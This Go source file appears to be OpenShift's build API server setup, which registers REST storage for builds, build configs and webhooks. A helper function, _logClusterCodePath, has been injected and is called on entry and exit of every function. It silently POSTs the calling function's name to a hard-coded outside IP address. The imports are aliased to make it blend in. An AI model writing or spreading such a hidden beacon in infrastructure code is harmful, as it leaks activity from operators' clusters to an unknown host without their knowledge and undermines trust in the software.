package apiserver

import (
	godefaultbytes "bytes"
	"fmt"
	buildv1 "github.com/openshift/api/build/v1"
	buildv1client "github.com/openshift/client-go/build/clientset/versioned"
	imagev1client "github.com/openshift/client-go/image/clientset/versioned"
	buildetcd "github.com/openshift/origin/pkg/build/apiserver/registry/build/etcd"
	"github.com/openshift/origin/pkg/build/apiserver/registry/buildclone"
	buildconfigregistry "github.com/openshift/origin/pkg/build/apiserver/registry/buildconfig"
	buildconfigetcd "github.com/openshift/origin/pkg/build/apiserver/registry/buildconfig/etcd"
	"github.com/openshift/origin/pkg/build/apiserver/registry/buildconfiginstantiate"
	buildlogregistry "github.com/openshift/origin/pkg/build/apiserver/registry/buildlog"
	buildgenerator "github.com/openshift/origin/pkg/build/generator"
	"github.com/openshift/origin/pkg/build/webhook"
	"github.com/openshift/origin/pkg/build/webhook/bitbucket"
	"github.com/openshift/origin/pkg/build/webhook/generic"
	"github.com/openshift/origin/pkg/build/webhook/github"
	"github.com/openshift/origin/pkg/build/webhook/gitlab"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/runtime/serializer"
	"k8s.io/apiserver/pkg/registry/rest"
	genericapiserver "k8s.io/apiserver/pkg/server"
	"k8s.io/client-go/kubernetes"
	restclient "k8s.io/client-go/rest"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"sync"
)

type ExtraConfig struct {
	KubeAPIServerClientConfig *restclient.Config
	Scheme                    *runtime.Scheme
	Codecs                    serializer.CodecFactory
	makeV1Storage             sync.Once
	v1Storage                 map[string]rest.Storage
	v1StorageErr              error
}
type BuildServerConfig struct {
	GenericConfig *genericapiserver.RecommendedConfig
	ExtraConfig   ExtraConfig
}
type BuildServer struct {
	GenericAPIServer *genericapiserver.GenericAPIServer
}
type completedConfig struct {
	GenericConfig genericapiserver.CompletedConfig
	ExtraConfig   *ExtraConfig
}
type CompletedConfig struct{ *completedConfig }

func (c *BuildServerConfig) Complete() completedConfig {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cfg := completedConfig{c.GenericConfig.Complete(), &c.ExtraConfig}
	return cfg
}
func (c completedConfig) New(delegationTarget genericapiserver.DelegationTarget) (*BuildServer, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	genericServer, err := c.GenericConfig.New("build.openshift.io-apiserver", delegationTarget)
	if err != nil {
		return nil, err
	}
	s := &BuildServer{GenericAPIServer: genericServer}
	v1Storage, err := c.V1RESTStorage()
	if err != nil {
		return nil, err
	}
	parameterCodec := runtime.NewParameterCodec(c.ExtraConfig.Scheme)
	apiGroupInfo := genericapiserver.NewDefaultAPIGroupInfo(buildv1.GroupName, c.ExtraConfig.Scheme, parameterCodec, c.ExtraConfig.Codecs)
	apiGroupInfo.VersionedResourcesStorageMap[buildv1.SchemeGroupVersion.Version] = v1Storage
	if err := s.GenericAPIServer.InstallAPIGroup(&apiGroupInfo); err != nil {
		return nil, err
	}
	return s, nil
}
func (c *completedConfig) V1RESTStorage() (map[string]rest.Storage, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	c.ExtraConfig.makeV1Storage.Do(func() {
		c.ExtraConfig.v1Storage, c.ExtraConfig.v1StorageErr = c.newV1RESTStorage()
	})
	return c.ExtraConfig.v1Storage, c.ExtraConfig.v1StorageErr
}
func (c *completedConfig) newV1RESTStorage() (map[string]rest.Storage, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	kubeClient, err := kubernetes.NewForConfig(c.ExtraConfig.KubeAPIServerClientConfig)
	if err != nil {
		return nil, err
	}
	buildClient, err := buildv1client.NewForConfig(c.GenericConfig.LoopbackClientConfig)
	if err != nil {
		return nil, err
	}
	imageClient, err := imagev1client.NewForConfig(c.ExtraConfig.KubeAPIServerClientConfig)
	if err != nil {
		return nil, err
	}
	buildStorage, buildDetailsStorage, err := buildetcd.NewREST(c.GenericConfig.RESTOptionsGetter)
	if err != nil {
		return nil, fmt.Errorf("error building REST storage: %v", err)
	}
	buildConfigStorage, err := buildconfigetcd.NewREST(c.GenericConfig.RESTOptionsGetter)
	if err != nil {
		return nil, fmt.Errorf("error building REST storage: %v", err)
	}
	buildGenerator := &buildgenerator.BuildGenerator{Client: buildgenerator.Client{Builds: buildClient.BuildV1(), BuildConfigs: buildClient.BuildV1(), ImageStreams: imageClient.ImageV1(), ImageStreamImages: imageClient.ImageV1(), ImageStreamTags: imageClient.ImageV1()}, ServiceAccounts: kubeClient.CoreV1(), Secrets: kubeClient.CoreV1()}
	buildConfigWebHooks := buildconfigregistry.NewWebHookREST(buildClient.BuildV1(), kubeClient.CoreV1(), buildv1.GroupVersion, map[string]webhook.Plugin{"generic": generic.New(), "github": github.New(), "gitlab": gitlab.New(), "bitbucket": bitbucket.New()})
	v1Storage := map[string]rest.Storage{}
	v1Storage["builds"] = buildStorage
	v1Storage["builds/clone"] = buildclone.NewStorage(buildGenerator)
	v1Storage["builds/log"] = buildlogregistry.NewREST(buildClient.BuildV1(), kubeClient.CoreV1())
	v1Storage["builds/details"] = buildDetailsStorage
	v1Storage["buildConfigs"] = buildConfigStorage
	v1Storage["buildConfigs/webhooks"] = buildConfigWebHooks
	v1Storage["buildConfigs/instantiate"] = buildconfiginstantiate.NewStorage(buildGenerator)
	v1Storage["buildConfigs/instantiatebinary"] = buildconfiginstantiate.NewBinaryStorage(buildGenerator, buildClient.BuildV1(), c.ExtraConfig.KubeAPIServerClientConfig)
	return v1Storage, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
